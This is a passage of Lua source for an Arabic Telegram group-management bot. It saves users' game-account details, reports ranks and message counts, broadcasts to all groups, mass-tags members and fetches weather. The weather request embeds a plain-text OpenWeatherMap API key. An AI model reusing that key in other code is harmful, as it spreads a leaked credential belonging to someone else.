KASPERdx1:set(KASPER..'bot:n3'..msg.sender_user_id_, 'no')
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙تم حفظ التقييم ،\n✟︙تم حفظ حسابك بالبوت ،\n  ', 'md')
KASPERdx1:set(KASPER..'bot:acctear'..msg.sender_user_id_, text)
return false 
else 
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙لم يتم حفظ التقييم يوجد خطأ ، ', 'html')
return false end
end
--     By Developer KASPER     -- 
if (text and text == 'مسح حسابي') and KASPER11(msg) then
KASPERdx1:del(KASPER..'bot:idacount'..msg.sender_user_id_)
KASPERdx1:del(KASPER..'bot:acctear'..msg.sender_user_id_)
KASPERdx1:del(KASPER..'bot:name_acount'..msg.sender_user_id_)
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙تم مسح حسابك من البوت ، ✔️ ', 'html')
end
--     By Developer KASPER     -- 
if (text and text == 'حسابي') and KASPER11(msg) then
if KASPERdx1:get(KASPER..'bot:idacount'..msg.sender_user_id_)then
local n = KASPERdx1:get(KASPER..'bot:idacount'..msg.sender_user_id_)
local nn = KASPERdx1:get(KASPER..'bot:acctear'..msg.sender_user_id_)
local nnn = KASPERdx1:get(KASPER..'bot:name_acount'..msg.sender_user_id_)
local Texting = {
'ككفو ورمبي ☹️💞',
"تقييمك مصعده كمبره ؟ 😉💞",
"تقيمك هذا وحدك جبته لْـۆ هكر وياك 🥱!",
"طفي الهاك اخي طفي 🤥",
"ليش متمسح ببجي مو احسلك 🤧",
"شكبرك شكدك وهذا تقيمك مقتنع بي انته!!!",
}
local KASPER_send = Texting[math.random(#Texting)]
KASPERdx(msg.chat_id_, msg.id_, 1,"\n✟︙حسابك على الببجي ،\n✟︙اسم حسابك ، {`"..nnn.."`}\n✟︙ايدي حسابك ، {`"..n.."`}\n✟︙تقييمك ، {`"..nn.."`}\n\n✟︙{"..KASPER_send.."}", 1, 'md')
else 
KASPERdx(msg.chat_id_, msg.id_, 1,'\n✟︙لم يتم حفظ حسابك بالبوت ، \n✟︙ارسل { وضع حسابي } ليتم حفظه .\n ', 'html')
end end end
--     By Developer KASPER     -- 
if text and (text:match("^موقعي$") and KASPER11(msg) or text:match("^رتبتي$")) and KASPER11(msg) then
function get_me(extra,result,success)
local KASPERy = (KASPERdx1:get('KASPER:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local KASPER = KASPERdx1:get(KASPER..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local msguser = tonumber(KASPERdx1:get(KASPER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = KASPERdx1:get(KASPER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(KASPERdx1:get(KASPER..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(KASPERdx1:get(KASPER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local text = (tonumber(KASPERdx1:get(KASPER.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local sticker = (tonumber(KASPERdx1:get(KASPER.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Photo = (tonumber(KASPERdx1:get(KASPER.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Voice = (tonumber(KASPERdx1:get(KASPER.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Gif = (tonumber(KASPERdx1:get(KASPER.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Video = (tonumber(KASPERdx1:get(KASPER.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
function formsgg(msgs) 
local KASPER = ''  
if msgs < 100 then 
KASPER = 'صنم' 
elseif msgs < 250 then 
KASPER = 'ضعيف' 
elseif msgs < 500 then 
KASPER = 'غير متفاعل' 
elseif msgs < 750 then 
KASPER = 'متوسط كثر حجي' 
elseif msgs < 1000 then 
KASPER = 'متفاعل عمري' 
elseif msgs < 2000 then
KASPER = 'متفاعل استمر' 
elseif msgs < 3000 then 
KASPER = 'ملك التفاعل'  
elseif msgs < 4000 then 
KASPER = 'اسطوره التفاعل' 
elseif msgs < 5000 then 
KASPER = 'تفاعلك نار يبا' 
elseif msgs < 5500 then 
KASPER = 'نار وشرار' 
elseif msgs < 6000 then 
KASPER = 'خيالي' 
elseif msgs < 7000 then 
KASPER = 'كافر بالتفاعل' 
elseif msgs < 8000 then 
KASPER = 'رب التفاعل ' 
end 
return KASPER
end
if result.username_ then
username = '@'..result.username_
else
username = 'لا يوجد'
end
if result.last_name_ then
lastname = result.last_name_
else
lastname = ''
end
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اهلا بك 👋 ، { '..result.first_name_..' }\n\n✟︙معرفك ، { '..username..' }\n✟︙ايديك ، { '..result.id_..' }\n✟︙نقاطك ، { '..user_nkt..' }\n\n✟︙{ احصائيات الرسائل } ⬇️،\n✟︙الرسائل ، { '..(user_msgs + KASPERy)..' / '..(KASPER)..'} \n✟︙ الملصقات ، { '..sticker..' }\n✟︙الصور ، { '..Photo..' }\n✟︙الصوت ، { '..Voice..' }\n✟︙المتحركه ، { '..Gif..' }\n✟︙ الفيديو ، { '..Video..' }\n✟︙الجهات ، { '..cont..' }\n✟︙التفاعل ، { '..formsgg(msguser)..' } \n\n✟︙موقعك ، '..KASPER_renk(msg.sender_user_id_, msg.chat_id_), 1, 'html')
end
getUser(msg.sender_user_id_,get_me)
end
--     By Developer KASPER     -- 
if text:match("^الرتبه$") and msg.reply_to_message_id_ ~= 0 and KASPER11(msg) then
function rt_by_reply(extra, result, success) 
local user_info_ = KASPERdx1:get(KASPER..'user:Name' .. result.sender_user_id_)
local KASPER_res = user_info_
if user_info_ then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
renk_gps = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
renk_gps = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
renk_gps = 'عضو'
end
if result.id_ then 
if tonumber(result.sender_user_id_) == tonumber(1299351897) then
KASPER1 = 'مبرمج السورس  '
elseif tonumber(result.sender_user_id_) == tonumber(bot_owner) then
KASPER1 = "مطور اساسي "
elseif is_sudoid(result.sender_user_id_) then
KASPER1 = "مطور ثانوي"
elseif is_admin(result.sender_user_id_, msg.chat_id_) then
KASPER1 = "مطور رتبه ثالثه "
elseif is_onall(result.sender_user_id_) then
KASPER1 = "مدير عام "
elseif is_moall(result.sender_user_id_) then
KASPER1 = "ادمن عام "
elseif is_vpall(result.sender_user_id_) then
KASPER1 = "مميز عام "
elseif is_monsh(result.sender_user_id_, msg.chat_id_) then
KASPER1 = "منشئ اساسي "
elseif is_monsh2(result.sender_user_id_, msg.chat_id_) then
KASPER1 = "منشئ "
elseif is_owner(result.sender_user_id_, msg.chat_id_) then
KASPER1 = "مدير "
elseif is_momod(result.sender_user_id_, msg.chat_id_) then
KASPER1 = "ادمن "
elseif is_vipmem(result.sender_user_id_, msg.chat_id_) then
KASPER1 = "عضو مميز "
elseif is_donky(result.sender_user_id_, msg.chat_id_) then
KASPER1 = "مطي مرتب 😹💔"
else
KASPER1 = "عضو فقط "
end end
local KASPER = '*✟︙اهلا بك عزيزي ، { '..renk_KASPER(msg)..' }*\n*✟︙رتبه المستخدم ،* { '..KASPER_res..' }\n*✟︙في البوت ، { '..KASPER_renk(result.sender_user_id_, msg.chat_id_)..' }*\n*✟︙في الكروب ، { '..renk_gps..' }*\n'
KASPERdx(msg.chat_id_, msg.id_, 1,KASPER, 1, 'md') 
end,nil) end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,rt_by_reply)
end
--     By Developer KASPER     -- 
if is_sudo(msg) then
if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0 then
function KASPER(extra,result,success)
local listgp = KASPERdx1:smembers(KASPER.."bot:groups")
for k,v in pairs(listgp) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
local listpv = KASPERdx1:smembers(KASPER.."bot:userss")
for k,v in pairs(listpv) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end end
local gps = KASPERdx1:scard(KASPER..'bot:groups') or 0
local pvs = KASPERdx1:scard(KASPER..'bot:userss') or 0
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم اذاعة رسالتك بالتوجيه ، \n✟︙في ، ❨ '..gps..' ❩ مجموعه \n✟︙والى ، ❨ '..pvs..' ❩ مشترك ', 1, 'md')
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),KASPER)
end end
--     By Developer KASPER     -- 
if text:match("^(time)$") or text:match("^(الوقت)$")  and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙الساعه ، '..os.date("%I:%M%p")..' \n✟︙التاريخ ، '..os.date("%Y/%m/%d")..' \n', 1, 'md')
end
--     By Developer KASPER     -- 
if text:match("^مشاهده المنشور$") and KASPER11(msg) then
KASPERdx1:set(KASPER..'bot:viewget'..msg.sender_user_id_,true)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙ارسل لي المنشور الان ، ', 1, 'md')
end
--     By Developer KASPER     -- 
if text:match("^اطردني$") and KASPER11(msg) then
if not KASPERdx1:get(KASPER.."lock_kickme"..msg.chat_id_) then
KASPERdx1:set(KASPER..'yes'..msg.sender_user_id_..'', 'kickyes')
KASPERdx1:set(KASPER..'no'..msg.sender_user_id_..'', 'kickno')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل *{ نعم }* ليتم طردك ،\n✟︙ارسل *{ لا } *ليتم الغاء طردك ، ", 1, "md")
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذه الخاصيه معطله . ', 1, 'md')
end end
local kickme = KASPERdx1:get(KASPER..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
if text:match("^نعم$") then
if is_vipmem(msg.sender_user_id_, msg.chat_id_) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙لا استطيع طرد المشرفين ، ", 1, "md")
else
local kickme = KASPERdx1:get(KASPER..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
KASPERdx1:del(KASPER..'yes'..msg.sender_user_id_..'', 'kickyes')
KASPERdx1:del(KASPER..'no'..msg.sender_user_id_..'', 'kickno')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم طردك عزيزي ،", 1, "md")
end end end
if text:match("^لا$") then
local notkickme = KASPERdx1:get(KASPER..'no'..msg.sender_user_id_..'')
if notkickme == 'kickno' then
KASPERdx1:del(KASPER..'yes'..msg.sender_user_id_..'', 'kickyes')
KASPERdx1:del(KASPER..'no'..msg.sender_user_id_..'', 'kickno')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم الغاء طردك ،", 1, "md")
end end end
--     By Developer KASPER     -- 
if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if not KASPERdx1:get(KASPER.."lock_kickme"..msg.chat_id_) then
KASPERdx1:set(KASPER.."lock_kickme"..msg.chat_id_, true)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تعطيل امر اطردني ، ', 1, 'md')
end end
if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if KASPERdx1:get(KASPER.."lock_kickme"..msg.chat_id_) then
KASPERdx1:del(KASPER.."lock_kickme"..msg.chat_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تفعيل امر اطردني ، ', 1, 'md')
end end
--     By Developer KASPER     -- 
if text:match("^نزلني$") and KASPER11(msg) then
if not KASPERdx1:get(KASPER.."lock_delme"..msg.chat_id_) then
KASPERdx1:set(KASPER..'yesdel'..msg.sender_user_id_..'', 'delyes')
KASPERdx1:set(KASPER..'nodel'..msg.sender_user_id_..'', 'delno')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙هل انت متأكد من تنزيلك ،\n✟︙ارسل *{ نعم }* ليتم الامر \n✟︙ارسل *{ لا }* لالغاء الامر ", 1, "md")
else
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذه هذه الخاصيه معطله ،', 1, 'md')
end end
local delme = KASPERdx1:get(KASPER..'yesdel'..msg.sender_user_id_..'')
if delme == 'delyes' then
if text:match("^نعم$") then
local delme = KASPERdx1:get(KASPER..'yesdel'..msg.sender_user_id_..'')
if delme == 'delyes' then
if KASPERdx1:sismember(KASPER..'bot:monsh:'..msg.chat_id_, msg.sender_user_id_) then
monsh = 'المنشئين الاساسيين ، ' else monsh = '' end 
if KASPERdx1:sismember(KASPER..'bot:monsh2:'..msg.chat_id_, msg.sender_user_id_) then
monsh2 = 'المنشئين ، ' else monsh2 = '' end 
if KASPERdx1:sismember(KASPER..'bot:owners:'..msg.chat_id_, msg.sender_user_id_) then
owner = 'المدراء ، ' else owner = '' end
if KASPERdx1:sismember(KASPER..'bot:momod:'..msg.chat_id_, msg.sender_user_id_) then
momod = 'الادمنيه ، ' else momod = '' end
if KASPERdx1:sismember(KASPER..'bot:vipmem:'..msg.chat_id_, msg.sender_user_id_) then
vipmem = 'المميزين ، ' else vipmem = '' end
if KASPERdx1:sismember(KASPER..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
donky = 'المطايه ، ' else donky = '' end 
if KASPERdx1:sismember(KASPER..'bot:monsh:'..msg.chat_id_, msg.sender_user_id_) or KASPERdx1:sismember(KASPER..'bot:owners:'..msg.chat_id_, msg.sender_user_id_) or KASPERdx1:sismember(KASPER..'bot:momod:'..msg.chat_id_, msg.sender_user_id_) or KASPERdx1:sismember(KASPER..'bot:vipmem:'..msg.chat_id_, msg.sender_user_id_) or KASPERdx1:sismember(KASPER..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
KASPERdx1:srem(KASPER..'bot:monsh:'..msg.chat_id_,msg.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:monsh2:'..msg.chat_id_,msg.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:owners:'..msg.chat_id_,msg.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:momod:'..msg.chat_id_,msg.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:vipmem:'..msg.chat_id_,msg.sender_user_id_)
KASPERdx1:srem(KASPER..'bot:donky:'..msg.chat_id_,msg.sender_user_id_) 
KASPERdx1:del(KASPER..'yesdel'..msg.sender_user_id_..'', 'delyes') 
KASPERdx1:del(KASPER..'nodel'..msg.sender_user_id_..'', 'delno')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تنزيلك من ، \n ( "..monsh..''..monsh2..''..owner..''..momod..''..vipmem..''..donky.." )  \n", 1, "md")
else 
KASPERdx1:del(KASPER..'yesdel'..msg.sender_user_id_..'', 'delyes') 
KASPERdx1:del(KASPER..'nodel'..msg.sender_user_id_..'', 'delno')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ليس لديك اي رتبه هنا ،", 1, "md")
end end end
if text:match("^لا$") then
local notdelme = KASPERdx1:get(KASPER..'nodel'..msg.sender_user_id_..'')
if notdelme == 'delno' then
KASPERdx1:del(KASPER..'yesdel'..msg.sender_user_id_..'', 'delyes')
KASPERdx1:del(KASPER..'nodel'..msg.sender_user_id_..'', 'delno')
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم الغاء تنزيلك ،", 1, "md")
end end end   
--     By Developer KASPER     -- 
if text == 'تعطيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if not KASPERdx1:get(KASPER.."lock_delme"..msg.chat_id_) then
KASPERdx1:set(KASPER.."lock_delme"..msg.chat_id_, true)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اهلا عزيزي ، '..renk_KASPER(msg)..' \n✟︙تم تعطيل امر نزلني ،', 1, 'md')
end end
if text == 'تفعيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then
if KASPERdx1:get(KASPER.."lock_delme"..msg.chat_id_) then
KASPERdx1:del(KASPER.."lock_delme"..msg.chat_id_)
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙اهلا عزيزي ، '..renk_KASPER(msg)..' \n✟︙تم تفعيل امر نزلني ،', 1, 'md')
end end
--     By Developer KASPER     -- 
if text:match("^كلهم (.*)$")  and KASPER11(msg) then
local txt = {string.match(text, "^(كلهم) (.*)$")}
function tall(f1, f2)
local text = "✟︙ "..txt[2].." \n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
i = 0
for k, v in pairs(f2.members_) do
i = i + 1
if KASPERdx1:get(bot_id..'KASPER:UserName'..v.user_id_) then
text = text..""..i.." - : [@"..KASPERdx1:get(bot_id..'KASPER:UserName'..v.user_id_).."]\n"
else
text = text..""..i.." - : "..v.user_id_.."\n"
end
end
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
--     By Developer KASPER     -- 
if text == "all" or text == "@all" or text == "تاك للكل" or text == "تاك الكل" and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then if KASPERdx1:get(KASPER..'bot:lock_tag'..msg.chat_id_) then KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذا الامر معطل ', 1, 'md') else if KASPERdx1:get(KASPER.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end KASPERdx1:setex(bot_id..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,KASPER)  tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = KASPER.member_count_},function(dxx,KASPERr) x = 0 tags = 0 local list = KASPERr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end end
--     By Developer KASPER     -- 
if text:match("^all (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then local txt = {string.match(text, "^(all) (.*)$")} if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذا الامر معطل ', 1, 'md') end if KASPERdx1:get(KASPER.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end KASPERdx1:setex(KASPER..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,KASPER) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = KASPER.member_count_},function(dxx,KASPERr) x = 0 tags = 0 local list = KASPERr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end
--     By Developer KASPER     -- 
if text:match("^@all (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then local txt = {string.match(text, "^(@all) (.*)$")} if KASPERdx1:get(KASPER..'bot:lock_geam'..msg.chat_id_) then KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙هذا الامر معطل ', 1, 'md') else if KASPERdx1:get(KASPER.."taagall"..msg.chat_id_..':'..msg.sender_user_id_) then return KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙انتظر لا يمكن عمل تاك قبل انتهاء 5 دقائق للتاك السابق", 1, 'md') end KASPERdx1:setex(KASPER..'taagall'..msg.chat_id_..':'..msg.sender_user_id_,300,true) tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(dx,KASPER) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = KASPER.member_count_},function(dxx,KASPERr) x = 0 tags = 0 local list = KASPERr.members_ for k, v in pairs(list) do tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) if x == 5 or x == tags or k == 0 then tags = x + 5 t = "#all "..txt[2].."\n\n" end x = x + 1 taagall = data.first_name_ taagall = taagall:gsub("]","") taagall = taagall:gsub("[[]","") t = t..", ["..taagall.."](tg://user?id="..v.user_id_..")" if x == 5 or x == tags or k == 0 then local Text = t:gsub('#all,','#all\n') sendText(msg.chat_id_,Text,0,'md') end end,nil) end end,nil) end,nil) end end
--     By Developer KASPER     --
if text == 'الكروبات' and is_admin(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then 
local KASPER = KASPERdx1:scard(KASPER.."bot:groups")
local dx = KASPERdx1:scard("KASPER:addg"..bot_id) or 0 
local users = KASPERdx1:scard(KASPER.."bot:userss")
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙*اعضاء الخاص ، { '..users..' }\n✟︙عدد كروبات ، { '..KASPER..' }\n✟︙الكروبات المفعله ، { '..dx..' }\n✟︙الغير مفعله ، {'..(KASPER - dx)..'} *', 1, 'md')
end
--     By Developer KASPER     -- 
if text:match("^رسائلي$") and msg.reply_to_message_id_ == 0  and KASPER11(msg) then
local user_msgs = KASPERdx1:get(KASPER..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local KASPER = KASPERdx1:get(KASPER..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local KASPERy = (KASPERdx1:get('KASPER:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙اهلا وسهلا عزيزي \n✟︙رسائلك الحقيقيه ، {*"..user_msgs.." }* \n✟︙رسائلك المضافه ، {*"..KASPERy.." }* \n✟︙رسائلك اليوم ،*{"..(KASPER).."} *\n✟︙مجموع رسائلك ، {*"..(user_msgs + KASPERy).." }* \n✟︙في المجموعه ", 1, 'md')
end
--     By Developer KASPER     -- 
if text:match("^ايدي المجموعه$") and KASPER11(msg) then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ايدي المجموعه `"..msg.chat_id_.."`", 1, 'md') 
end
--     By Developer KASPER     -- 
if text:match("^ايديي$") and KASPER11(msg) then 
KASPERdx(msg.chat_id_, msg.id_, 1,'✟︙اهلا بك عزيزي ،  '..renk_KASPER(msg)..' \n✟︙ايديك هو ، `'..msg.sender_user_id_..'`', 1, 'md') 
end
--     By Developer KASPER     -- 
if text:match("^معرفي$")  and KASPER11(msg) then
function get_username(extra,result,success)
text = '✟︙معرفك ، {User}'
local text = text:gsub('{User}',('@'..result.username_ or ''))
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
--     By Developer KASPER     -- 
if text:match("^اسمي$") and KASPER11(msg) then
function get_firstname(extra,result,success)
text = '✟︙اسمك ، {firstname}'
local text = text:gsub('{firstname}',(result.first_name_ or ''))
KASPERdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     By Developer KASPER     -- 
if text:match('^الحساب (%d+)$') and KASPER11(msg) then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده العضو ✟︙'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
--     By Developer KASPER     -- 
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") and KASPER11(msg) then
 local inline = {{{text="- رابط الحذف،",url="https://telegram.org/deactivate"}}}
send_inline(msg.chat_id_,'✟︙فكر زين قبل لا تحذف عمري ،\n✟︙لحذف حسابك اضغط على الزر ⬇️ .',nil,inline) 
return false 
end 
--     By Developer KASPER     -- 
if text:match("^source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") and KASPER11(msg) then 
local inline = {
{{text="- قناة السورس ،",url="t.me/KASPER_ch"},
{text="- مبرمج السورس،",url="t.me/kkkkf"}},
{{text="- اضغط هنا لتنصيب السورس ،",url="t.me/KASPER_ch"}},
{{text="- كروب المبرمجين ،",url="https://t.me/joinchat/TXKJWVCCy9FF6g6cjajRGA"},
{text="- شروحات السورس ،",url="t.me/Learn_KASPER"}}
}
send_inline(msg.chat_id_,'✟︙مرحبا بك في سورس فايدر┋KASPER ،\n✟︙اضغط على الازرار بالاسفل ⬇️ ،',nil,inline) 
return false 
end
--     By Developer KASPER     -- 
if text:match("^جهاتي$") and KASPER11(msg) then
add = (tonumber(KASPERdx1:get(KASPER..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙عدد الجهات الي ضفتها ،*{"..add.."}*", 1, 'md')
end
--     By Developer KASPER     -- 
if text:match("^رسائلي اليوم$") and KASPER11(msg) then 
local KASPER = KASPERdx1:get(KASPER..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙رسائلك اليوم ، *{"..(KASPER).."} *", 1, 'md')
end
--     By Developer KASPER     -- 
if text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$") or text:match("^(طقس) (.*)$") and KASPER11(msg) then
  MatchesEN = {text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$")}; MatchesFA = {text:match("^(طقس) (.*)$")}
  Ptrn = MatchesEN[2] or MatchesFA[2]
  local function temps(K)
   local F = (K*1.8)-459.67
   local C = K-273.15
   return F,C
  end
  local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=269ed82391822cc692c9afd59f4aabba")
  local jtab = json:decode(res)
  if jtab.name then
   if jtab.weather[1].main == "Thunderstorm" then
    status = "⛈ عاصف"
   elseif jtab.weather[1].main == "Drizzle" then
    status = "🌦 امطار خفيفه"
   elseif jtab.weather[1].main == "Rain" then
    status = "🌧 مطر شديد"
   elseif jtab.weather[1].main == "Snow" then
    status = "🌨 مثلج"
   elseif jtab.weather[1].main == "Atmosphere" then
    status = "🌫 مغبر"
   elseif jtab.weather[1].main == "Clear" then
    status = "🌤️ صاف"
   elseif jtab.weather[1].main == "Clouds" then
    status = "☁️ غائم"
   elseif jtab.weather[1].main == "Extreme" then
     status = "-------"
   elseif jtab.weather[1].main == "Additional" then
    status = "-------"
   else
    status = "-------"
   end
   local F1,C1 = temps(jtab.main.temp)
   local F2,C2 = temps(jtab.main.temp_min)
   local F3,C3 = temps(jtab.main.temp_max)
   if jtab.rain then
    rain = jtab.rain["3h"].." ميليمتر"
   else
    rain = "-----"
   end
   if jtab.snow then
    snow = jtab.snow["3h"].." ميليمتر"
   else
    snow = "-----"
   end
   today = "• اسم المدينه : *"..jtab.name.."*\n"
   .."• اسم الدوله : *"..(jtab.sys.country or "----").."*\n"
   .."• درجه الحراره :\n"
   .."   "..C1.."° سلليزي\n"
   .."   "..F1.."° فهرنهايت\n"
   .."   "..jtab.main.temp.."° كلفن\n"
   .."• الجو "..status.." تقريبا\n\n"
   .."• درجه حراره اليوم الصغرى : C"..C2.."°   F"..F2.."°   K"..jtab.main.temp_min.."°\n"
   .."• درجه حراره اليوم الكبرى : C"..C3.."°   F"..F3.."°   K"..jtab.main.temp_max.."°\n"
   .."• رطوبة الهواء : "..jtab.main.humidity.."%\n"
   .."• كثافه الغيوم : "..jtab.clouds.all.."%\n"
   .."• سرعه الرياح : "..(jtab.wind.speed or "------").." متر / ثانيه\n"
   .."• اتجاه الرياح : "..(jtab.wind.deg or "------").."° درجه\n"
   .."• تقلب الرياح : "..(jtab.main.pressure/1000).."\n"
   .."• اخر 3 ساعات من المطر : "..rain.."\n"
   .."• اخر 3 ساعات من تساقط الثلوج : "..snow.."\n\n"
   after = ""
